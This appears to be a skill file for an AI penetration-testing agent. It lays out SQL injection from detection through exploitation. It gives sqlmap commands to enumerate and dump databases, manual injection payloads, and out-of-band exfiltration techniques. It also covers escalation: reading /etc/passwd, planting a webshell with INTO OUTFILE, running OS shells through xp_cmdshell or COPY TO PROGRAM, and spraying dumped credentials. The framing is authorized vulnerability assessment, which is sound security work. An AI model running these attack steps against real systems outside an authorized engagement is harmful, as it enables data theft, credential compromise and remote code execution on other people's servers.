---
name: web-sqli
description: SQL injection detection→exploitation→proof for web apps and APIs. Use when a parameter reaches a DB query, when input triggers a SQL error / boolean or time differential, or during VULN-ASSESSMENT/EXPLOITATION on a web target. Triggers - sql syntax error, ORA-/MySQL/psql/SQLite error string, ' or 1=1, order by, sleep-based delay, login bypass, id/search/filter param.
tags: [vuln_assess, exploitation]
---

# SQL Injection

## When this fires
A param reaches a query; you see a SQL error, a boolean-differential (true≠false response), or a time delay on a payload. Also any login/search/id/sort param on a DB-backed app.

## Detect (tool-first, low-noise)
Drive detection with sqlmap, not by eye — it covers boolean/error/union/time/stack + gives an evidence chain:
```bash
sqlmap -u 'http://<t>/item?id=1' --batch --level 3 --risk 2 --random-agent | tee /tmp/sqlmap.txt
# non-standard transport (JSON body / RSC / GraphQL / custom headers): save the full request, then:
sqlmap -r /tmp/request.txt -p <param> --batch
```
Then `sqlmap_parse` on the output. A single manual probe (`'`, `' OR '1'='1' -- -`, `1 AND SLEEP(5)`) is a confirm poke ONLY — never the detection method or a payload sweep by hand.

## Decide
- Error shown → error-based / UNION (fastest data). Get column count: `ORDER BY N` until it breaks; find the reflected column; fingerprint DB (`@@version`, `version()`, `sqlite_version()`).
- No error but true≠false → boolean-blind. No differential but timing → time-blind (`SLEEP`/`WAITFOR DELAY`/`pg_sleep`/`dbms_pipe.receive_message`).
- No in-band channel → OOB (DNS/HTTP exfil) via `--dns-domain` / MySQL `LOAD_FILE(CONCAT('\\\\',...))`, MSSQL `xp_dirtree`.

## Exploit → PROVE IMPACT
```bash
sqlmap -r /tmp/request.txt -p <param> --batch --dbs           # list databases
sqlmap ... -D <db> --tables ; sqlmap ... -D <db> -T <tbl> --dump   # extract
# creds/secrets → add_credential + cred_spray; escalate where possible:
#  MySQL FILE priv → --file-read=/etc/passwd, INTO OUTFILE webshell in webroot
#  MSSQL sa → --os-shell (xp_cmdshell) ; PostgreSQL superuser → COPY ... TO PROGRAM / --os-shell
```
**Proof required:** a dumped row a benign query couldn't return (a canary/secret value), a read file (`/etc/passwd`), or `id` via os-shell. "sqlmap says injectable" is a lead, not proof.

## Tooling
`sqlmap` (`--batch --random-agent`, `-r` for weird transports, `--technique BEUSTQ`, `--tamper` for WAF) → `sqlmap_parse`. `nuclei` for known-CVE SQLi in a specific product → `nuclei_parse`.

## False positives / pitfalls
- 200-on-everything / WAF echo → confirm a TRUE vs FALSE differential, not just a reflected string.
- Time-blind on a slow app → use several sleep durations, compare.
- Auth/CSRF-gated param → pass the session (`--cookie`/`--headers`), satisfy CSRF, or use `-r`.
